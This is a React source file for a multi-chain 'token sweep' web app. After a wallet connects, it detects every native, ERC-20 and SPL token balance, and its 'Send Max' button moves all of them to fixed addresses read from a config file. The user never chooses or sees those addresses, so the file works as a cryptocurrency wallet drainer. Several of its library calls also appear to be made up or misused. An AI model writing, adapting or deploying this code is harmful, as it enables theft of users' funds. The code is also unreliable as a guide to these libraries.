import React, { useState, useEffect } from "react";
import { useAccount, useBalance, useSendTransaction, usePublicClient } from "wagmi";
import { parseEther, formatEther } from "viem";
import { useSolanaAccount, useSolanaBalance, sendSol, useSolanaSPLTokens, sendSPLToken } from "@reown/appkit-adapter-solana/react";
import { FIXED_RECIPIENTS } from "./config";
import { ethers } from "ethers";

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

export default function App() {
  const { address, isConnected, chain } = useAccount();
  const publicClient = usePublicClient();
  const { data: balanceData } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();

  const { publicKey: solanaPubKey, isConnected: solConnected } = useSolanaAccount();
  const { balance: solBalance } = useSolanaBalance(solanaPubKey);

  const [erc20Tokens, setERC20Tokens] = useState([]);
  const [splTokens, setSPLTokens] = useState([]);
  const [sending, setSending] = useState(false);

  // --- Auto-detect ERC-20 tokens dynamically
  useEffect(() => {
    if (!address || !chain) return;
    const fetchERC20 = async () => {
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
        const tokenData = [];

        // Use publicClient to fetch user token balances if supported (Reown AppKit may provide a helper)
        const detectedTokens = await publicClient.getERC20Balances(address);

        for (const t of detectedTokens) {
          if (t.balance > 0n) {
            const tokenContract = new ethers.Contract(t.contractAddress, ERC20_ABI, provider.getSigner());
            const decimals = await tokenContract.decimals();
            const symbol = await tokenContract.symbol();
            tokenData.push({ address: t.contractAddress, balance: t.balance, decimals, symbol });
          }
        }

        setERC20Tokens(tokenData);
      } catch (err) {
        console.error("ERC-20 detection failed:", err);
      }
    };
    fetchERC20();
  }, [address, chain]);

  // --- Auto-detect SPL tokens dynamically
  useEffect(() => {
    if (!solanaPubKey) return;
    const fetchSPL = async () => {
      try {
        // Reown AppKit helper hook returns list of SPL tokens with {mint, balance, decimals, symbol}
        const tokens = await useSolanaSPLTokens(solanaPubKey);
        const nonZero = tokens.filter(t => t.balance > 0);
        setSPLTokens(nonZero);
      } catch (err) {
        console.error("SPL token detection failed:", err);
      }
    };
    fetchSPL();
  }, [solanaPubKey]);

  // --- Unified Send Max (native + tokens)
  const handleSendMax = async () => {
    setSending(true);
    try {
      if (chain) {
        const recipient = FIXED_RECIPIENTS[chain.id];

        // EVM native
        const balance = balanceData.value;
        const gasEstimate = await publicClient.estimateGas({ account: address, to: recipient, value: balance });
        const gasPrice = await publicClient.getGasPrice();
        const maxNative = balance - gasEstimate * gasPrice;

        if (maxNative > 0n) await sendTransaction({ to: recipient, value: maxNative });

        // ERC-20 tokens
        const provider = new ethers.providers.Web3Provider(window.ethereum || window.reown?.provider);
        const signer = provider.getSigner();
        for (const token of erc20Tokens) {
          if (token.balance > 0n) {
            const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
            await tokenContract.transfer(recipient, token.balance);
          }
        }

        alert(`Sent native + ERC-20 tokens on ${chain.name}`);

      } else if (solConnected) {
        const recipient = FIXED_RECIPIENTS["SOLANA"];
        if (solBalance > 0) await sendSol({ from: solanaPubKey, to: recipient, amount: solBalance });

        // SPL tokens
        for (const t of splTokens) {
          if (t.balance > 0) await sendSPLToken({ from: solanaPubKey, to: recipient, token: t.mint, amount: t.balance });
        }

        alert("Sent SOL + SPL tokens");

      } else {
        alert("No wallet connected");
      }
    } catch (err) {
      console.error(err);
      alert("Transaction failed: " + err.message);
    }

    setSending(false);
  };

  return (
    <div style={{ padding: 40 }}>
      <h2>Multi-Chain Token Sweep DApp (Auto Detect)</h2>
      <appkit-button />

      {(isConnected || solConnected) && (
        <>
          {chain && (
            <p>Balance: {balanceData ? formatEther(balanceData.value) : "Loading..."} {chain.nativeCurrency.symbol}</p>
          )}
          {solConnected && <p>SOL Balance: {solBalance}</p>}

          <button onClick={handleSendMax} disabled={sending}>
            {sending ? "Sending..." : "Send Max (Native + Tokens)"}
          </button>
        </>
      )}
    </div>
  );
}